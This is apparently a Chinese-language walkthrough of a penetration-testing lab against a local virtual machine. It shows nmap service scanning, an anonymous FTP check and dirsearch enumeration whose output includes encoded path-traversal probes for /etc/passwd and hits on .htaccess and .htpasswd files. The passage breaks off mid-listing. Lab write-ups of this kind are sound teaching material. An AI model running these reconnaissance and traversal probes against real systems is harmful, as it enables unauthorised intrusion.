<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>nmap <span class="token operator">-</span>sV <span class="token operator">-</span><span class="token constant">A</span> <span class="token operator">-</span><span class="token constant">O</span> <span class="token operator">-</span><span class="token constant">T4</span> <span class="token operator">-</span>p1<span class="token operator">-</span><span class="token number">10000</span> <span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.118</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211115180113516-2117323135.png" alt="image" /></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Starting Nmap <span class="token number">7.80</span> <span class="token punctuation">(</span> https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>nmap<span class="token punctuation">.</span>org <span class="token punctuation">)</span> at <span class="token number">2021</span><span class="token operator">-</span><span class="token number">11</span><span class="token operator">-</span><span class="token number">12</span> <span class="token number">04</span><span class="token operator">:</span><span class="token number">18</span> <span class="token constant">EST</span></pre></td></tr><tr><td data-num="2"></td><td><pre>Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.118</span></pre></td></tr><tr><td data-num="3"></td><td><pre>Host is <span class="token function">up</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">.</span>00049s latency<span class="token punctuation">)</span><span class="token punctuation">.</span></pre></td></tr><tr><td data-num="4"></td><td><pre>Not shown<span class="token operator">:</span> <span class="token number">9996</span> closed ports</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token constant">PORT</span>     <span class="token constant">STATE</span> <span class="token constant">SERVICE</span> <span class="token constant">VERSION</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">21</span><span class="token operator">/</span>tcp   open  ftp     vsftpd <span class="token number">2.3</span><span class="token number">.5</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token operator">|</span>_ftp<span class="token operator">-</span>anon<span class="token operator">:</span> Anonymous <span class="token constant">FTP</span> login <span class="token function">allowed</span> <span class="token punctuation">(</span><span class="token constant">FTP</span> code <span class="token number">230</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token operator">|</span> ftp<span class="token operator">-</span>syst<span class="token operator">:</span> </pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token operator">|</span>   <span class="token constant">STAT</span><span class="token operator">:</span> </pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token operator">|</span> <span class="token constant">FTP</span> server status<span class="token operator">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token operator">|</span>      Connected to <span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.115</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token operator">|</span>      Logged <span class="token keyword">in</span> <span class="token keyword">as</span> ftp</pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token operator">|</span>      <span class="token constant">TYPE</span><span class="token operator">:</span> <span class="token constant">ASCII</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token operator">|</span>      No session bandwidth limit</pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token operator">|</span>      Session timeout <span class="token keyword">in</span> seconds is <span class="token number">300</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token operator">|</span>      Control connection is plain text</pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token operator">|</span>      Data connections will be plain text</pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token operator">|</span>      At session startup<span class="token punctuation">,</span> client count was <span class="token number">2</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token operator">|</span>      vsFTPd <span class="token number">2.3</span><span class="token number">.5</span> <span class="token operator">-</span> secure<span class="token punctuation">,</span> fast<span class="token punctuation">,</span> stable</pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token operator">|</span>_End <span class="token keyword">of</span> status</pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token number">22</span><span class="token operator">/</span>tcp   open  ssh     OpenSSH <span class="token number">5</span><span class="token punctuation">.</span>9p1 Debian 5ubuntu1<span class="token punctuation">.</span><span class="token number">10</span> <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token operator">|</span> ssh<span class="token operator">-</span>hostkey<span class="token operator">:</span> </pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token operator">|</span>   <span class="token number">1024</span> <span class="token literal-property property">d4</span><span class="token operator">:</span>f8<span class="token operator">:</span>c1<span class="token operator">:</span><span class="token number">55</span><span class="token operator">:</span><span class="token number">92</span><span class="token operator">:</span><span class="token number">75</span><span class="token operator">:</span><span class="token number">93</span><span class="token operator">:</span>f7<span class="token operator">:</span>7b<span class="token operator">:</span><span class="token number">65</span><span class="token operator">:</span>dd<span class="token operator">:</span>2b<span class="token operator">:</span><span class="token number">94</span><span class="token operator">:</span>e8<span class="token operator">:</span>bb<span class="token operator">:</span><span class="token number">47</span> <span class="token punctuation">(</span><span class="token constant">DSA</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token operator">|</span>   <span class="token number">2048</span> 3d<span class="token operator">:</span><span class="token number">24</span><span class="token operator">:</span>ea<span class="token operator">:</span>4f<span class="token operator">:</span>a2<span class="token operator">:</span>2a<span class="token operator">:</span>ca<span class="token operator">:</span><span class="token number">63</span><span class="token operator">:</span>b7<span class="token operator">:</span>f4<span class="token operator">:</span><span class="token number">27</span><span class="token operator">:</span>0f<span class="token operator">:</span>d9<span class="token operator">:</span><span class="token number">17</span><span class="token operator">:</span><span class="token number">03</span><span class="token operator">:</span><span class="token number">22</span> <span class="token punctuation">(</span><span class="token constant">RSA</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token operator">|</span>_  <span class="token number">256</span> <span class="token literal-property property">e2</span><span class="token operator">:</span><span class="token number">54</span><span class="token operator">:</span>a7<span class="token operator">:</span>c7<span class="token operator">:</span>ef<span class="token operator">:</span>aa<span class="token operator">:</span>8c<span class="token operator">:</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">61</span><span class="token operator">:</span><span class="token number">20</span><span class="token operator">:</span>bd<span class="token operator">:</span>aa<span class="token operator">:</span><span class="token number">72</span><span class="token operator">:</span>c0<span class="token operator">:</span><span class="token number">17</span><span class="token operator">:</span><span class="token number">88</span> <span class="token punctuation">(</span><span class="token constant">ECDSA</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token number">80</span><span class="token operator">/</span>tcp   open  http    Apache httpd <span class="token number">2.2</span><span class="token number">.22</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token operator">|</span>_http<span class="token operator">-</span>server<span class="token operator">-</span>header<span class="token operator">:</span> Apache<span class="token operator">/</span><span class="token number">2.2</span><span class="token number">.22</span> <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token operator">|</span>_http<span class="token operator">-</span>title<span class="token operator">:</span> <span class="token constant">FRANK</span>'s Website <span class="token operator">|</span> Under development</pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token number">8011</span><span class="token operator">/</span>tcp open  http    Apache httpd <span class="token number">2.2</span><span class="token number">.22</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token operator">|</span>_http<span class="token operator">-</span>server<span class="token operator">-</span>header<span class="token operator">:</span> Apache<span class="token operator">/</span><span class="token number">2.2</span><span class="token number">.22</span> <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token operator">|</span>_http<span class="token operator">-</span>title<span class="token operator">:</span> Site doesn't have a <span class="token function">title</span> <span class="token punctuation">(</span>text<span class="token operator">/</span>html<span class="token punctuation">)</span><span class="token punctuation">.</span></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token constant">MAC</span> <span class="token literal-property property">Address</span><span class="token operator">:</span> <span class="token number">08</span><span class="token operator">:</span><span class="token number">00</span><span class="token operator">:</span><span class="token number">27</span><span class="token operator">:</span>3F<span class="token operator">:</span><span class="token constant">E0</span><span class="token operator">:</span><span class="token constant">B0</span> <span class="token punctuation">(</span>Oracle VirtualBox virtual <span class="token constant">NIC</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="33"></td><td><pre>Device type<span class="token operator">:</span> general purpose</pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token literal-property property">Running</span><span class="token operator">:</span> Linux <span class="token number">2.6</span><span class="token punctuation">.</span><span class="token constant">X</span></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token constant">OS</span> <span class="token constant">CPE</span><span class="token operator">:</span> cpe<span class="token operator">:</span><span class="token operator">/</span>o<span class="token operator">:</span>linux<span class="token operator">:</span>linux_kernel<span class="token operator">:</span><span class="token number">2.6</span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token constant">OS</span> <span class="token literal-property property">details</span><span class="token operator">:</span> Linux <span class="token number">2.6</span><span class="token number">.19</span> <span class="token operator">-</span> <span class="token number">2.6</span><span class="token number">.36</span></pre></td></tr><tr><td data-num="37"></td><td><pre>Network Distance<span class="token operator">:</span> <span class="token number">1</span> hop</pre></td></tr><tr><td data-num="38"></td><td><pre>Service Info<span class="token operator">:</span> OSs<span class="token operator">:</span> Unix<span class="token punctuation">,</span> Linux<span class="token punctuation">;</span> <span class="token constant">CPE</span><span class="token operator">:</span> cpe<span class="token operator">:</span><span class="token operator">/</span>o<span class="token operator">:</span>linux<span class="token operator">:</span>linux_kernel</pre></td></tr><tr><td data-num="39"></td><td><pre></pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token constant">TRACEROUTE</span></pre></td></tr><tr><td data-num="41"></td><td><pre><span class="token constant">HOP</span> <span class="token constant">RTT</span>     <span class="token constant">ADDRESS</span></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token number">1</span>   <span class="token number">0.49</span> ms <span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.118</span></pre></td></tr><tr><td data-num="43"></td><td><pre></pre></td></tr><tr><td data-num="44"></td><td><pre><span class="token constant">OS</span> and Service detection performed<span class="token punctuation">.</span> Please report any incorrect results at https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>nmap<span class="token punctuation">.</span>org<span class="token operator">/</span>submit<span class="token operator">/</span> <span class="token punctuation">.</span></pre></td></tr><tr><td data-num="45"></td><td><pre>Nmap done<span class="token operator">:</span> <span class="token number">1</span> <span class="token constant">IP</span> <span class="token function">address</span> <span class="token punctuation">(</span><span class="token number">1</span> host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">28.42</span> seconds</pre></td></tr></table></figure><p>这里我们发现靶机开放了 <code>21、22、80、8011</code>  四个端口，下面对四个开放端口分别进行探测。</p>
<h2 id="漏洞探测"><a class="anchor" href="#漏洞探测">#</a> 漏洞探测</h2>
<h3 id="ftp-服务"><a class="anchor" href="#ftp-服务">#</a> ftp 服务</h3>
<p>既然服务器开放了 <code>21端口</code> ，提供 <code>ftp服务</code> ，那我们就先通过浏览器访问看一下是否存在有用的信息：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token literal-property property">ftp</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.118</span><span class="token operator">:</span><span class="token number">21</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211115180224285-901553093.png" alt="image" /></p>
<p>可以看到这里并没有发现什么有用的东西，接下来就对 <code>http服务</code> 端口进行访问。</p>
<h3 id="http-服务"><a class="anchor" href="#http-服务">#</a> http 服务</h3>
<p><code>80端口</code> 和 <code>8011端口</code> 都开放了 http 服务，我们这里先访问一下 80 端口：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211115180258599-123367972.png" alt="image" /></p>
<p>这里发现是一个静态页面，应该是一个个人简历，网站的主人是 <code>Frank</code> ，页面上并没有给出什么有用的信息，但是应该可以尝试暴力破解。</p>
<p>查看一下源码：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211115180316270-1453740298.png" alt="image" /></p>
<p>同样没发现什么有用的信息。</p>
<p>那我们就对其目录进行扫描看看能不能发现什么有用的信息：</p>
<p>这里涉及到 <code>dirsearch</code>  工具，没有安装的直接使用 <code>git clone</code>  命令安装就好了</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>git clone https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>maurosoria<span class="token operator">/</span>dirsearch</pre></td></tr></table></figure><p>安装好后就执行如下命令对其目录进行扫描：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>python3 dirsearch<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"http://192.168.56.118/"</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211115180350888-325840903.png" alt="image" /></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>_<span class="token operator">|</span><span class="token punctuation">.</span> _ _  _  _  _ _<span class="token operator">|</span>_    v0<span class="token punctuation">.</span><span class="token number">4.2</span>                                           </pre></td></tr><tr><td data-num="2"></td><td><pre> <span class="token punctuation">(</span>_<span class="token operator">||</span><span class="token operator">|</span> _<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">/</span><span class="token function">_</span><span class="token punctuation">(</span>_<span class="token operator">||</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token punctuation">)</span>                                                    </pre></td></tr><tr><td data-num="3"></td><td><pre>                                                                           </pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token literal-property property">Extensions</span><span class="token operator">:</span> php<span class="token punctuation">,</span> aspx<span class="token punctuation">,</span> jsp<span class="token punctuation">,</span> html<span class="token punctuation">,</span> js <span class="token operator">|</span> <span class="token constant">HTTP</span> <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token constant">GET</span> <span class="token operator">|</span> Threads<span class="token operator">:</span> <span class="token number">30</span> <span class="token operator">|</span> Wordlist size<span class="token operator">:</span> <span class="token number">10929</span>                                                          </pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>Output File<span class="token operator">:</span> <span class="token operator">/</span>root<span class="token operator">/</span>Desktop<span class="token operator">/</span>dirsearch<span class="token operator">-</span>master<span class="token operator">/</span>reports<span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.118</span><span class="token operator">/</span><span class="token operator">-</span>_21<span class="token operator">-</span><span class="token number">11</span><span class="token operator">-</span><span class="token number">12_04</span><span class="token operator">-</span><span class="token number">32</span><span class="token operator">-</span><span class="token number">24</span><span class="token punctuation">.</span>txt</pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>Error Log<span class="token operator">:</span> <span class="token operator">/</span>root<span class="token operator">/</span>Desktop<span class="token operator">/</span>dirsearch<span class="token operator">-</span>master<span class="token operator">/</span>logs<span class="token operator">/</span>errors<span class="token operator">-</span><span class="token number">21</span><span class="token operator">-</span><span class="token number">11</span><span class="token operator">-</span><span class="token number">12_04</span><span class="token operator">-</span><span class="token number">32</span><span class="token operator">-</span><span class="token number">24</span><span class="token punctuation">.</span>log</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token literal-property property">Target</span><span class="token operator">:</span> http<span class="token operator">:</span><span class="token operator">/</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">192.168.56.118</span><span class="token regex-delimiter">/</span></span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">24</span><span class="token punctuation">]</span> Starting<span class="token operator">:</span> </pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token number">301</span> <span class="token operator">-</span>  313B  <span class="token operator">-</span> <span class="token operator">/</span>js  <span class="token operator">-</span><span class="token operator">></span>  http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.118</span><span class="token operator">/</span>js<span class="token operator">/</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token number">400</span> <span class="token operator">-</span>  306B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">%</span>2e<span class="token operator">/</span><span class="token operator">%</span>2e<span class="token operator">%</span>2e<span class="token operator">/</span><span class="token operator">%</span>2e<span class="token operator">%</span>2e<span class="token operator">/</span><span class="token operator">%</span>2e<span class="token operator">%</span>2e<span class="token operator">/</span>etc<span class="token operator">/</span>passwd</pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  293B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>ht_wsr<span class="token punctuation">.</span>txt</pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  296B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccess<span class="token punctuation">.</span>bak1</pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  297B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccess_extra</pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  294B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccess_sc</pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  296B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccess<span class="token punctuation">.</span>orig</pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  298B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccess<span class="token punctuation">.</span>sample</pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  286B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htm</pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  294B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccessOLD</pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  296B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccess_orig</pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  295B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccessOLD2</pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  294B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccessBAK</pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  296B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccess<span class="token punctuation">.</span>save</pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  287B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>html</pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  296B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htpasswd_test</pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  292B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htpasswds</pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  293B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>httr<span class="token operator">-</span>oauth</pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token number">200</span> <span class="token operator">-</span>    1KB <span class="token operator">-</span> <span class="token operator">/</span><span class="token constant">LICENSE</span></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token number">200</span> <span class="token operator">-</span>    4KB <span class="token operator">-</span> <span class="token operator">/</span><span class="token constant">README</span><span class="token punctuation">.</span>md</pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">35</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  290B  <span class="token operator">-</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">cgi-bin</span><span class="token regex-delimiter">/</span></span></pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">35</span><span class="token punctuation">]</span> <span class="token number">400</span> <span class="token operator">-</span>  306B  <span class="token operator">-</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">cgi-bin</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token operator">%</span>2e<span class="token operator">/</span><span class="token operator">%</span>2e<span class="token operator">%</span>2e<span class="token operator">/</span><span class="token operator">%</span>2e<span class="token operator">%</span>2e<span class="token operator">/</span><span class="token operator">%</span>2e<span class="token operator">%</span>2e<span class="token operator">/</span>etc<span class="token operator">/</span>passwd</pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">37</span><span class="token punctuation">]</span> <span class="token number">301</span> <span class="token operator">-</span>  314B  <span class="token operator">-</span> <span class="token operator">/</span>css  <span class="token operator">-</span><span class="token operator">></span>  http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.118</span><span class="token operator">/</span>css<span class="token operator">/</span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">37</span><span class="token punctuation">]</span> <span class="token number">401</span> <span class="token operator">-</span>  481B  <span class="token operator">-</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">development</span><span class="token regex-delimiter">/</span></span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">37</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  290B  <span class="token operator">-</span> <span class="token operator">/</span>doc<span class="token operator">/</span>api<span class="token operator">/</span></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">37</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  301B  <span class="token operator">-</span> <span class="token operator">/</span>doc<span class="token operator">/</span>en<span class="token operator">/</span>changes<span class="token punctuation">.</span>html</pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">37</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  300B  <span class="token operator">-</span> <span class="token operator">/</span>doc<span class="token operator">/</span>stable<span class="token punctuation">.</span>version</pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">37</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  301B  <span class="token operator">-</span> <span class="token operator">/</span>doc<span class="token operator">/</span>html<span class="token operator">/</span>index<span class="token punctuation">.</span>html</pre></td></tr><tr><td data-num="41"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">37</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  286B  <span class="token operator">-</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">doc</span><span class="token regex-delimiter">/</span></span></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">39</span><span class="token punctuation">]</span> <span class="token number">200</span> <span class="token operator">-</span>    3KB <span class="token operator">-</span> <span class="token operator">/</span>gulpfile<span class="token punctuation">.</span>js</pre></td></tr><tr><td data-num="43"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">40</span><span class="token punctuation">]</span> <span class="token number">301</span> <span class="token operator">-</span>  314B  <span class="token operator">-</span> <span class="token operator">/</span>img  <span class="token operator">-</span><span class="token operator">></span>  http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.118</span><span class="token operator">/</span>img<span class="token operator">/</span></pre></td></tr><tr><td data-num="44"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">40</span><span class="token punctuation">]</span> <span class="token number">200</span> <span class="token operator">-</span>   13KB <span class="token operator">-</span> <span class="token operator">/</span>index<span class="token punctuation">.</span>html</pre></td></tr><tr><td data-num="45"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token 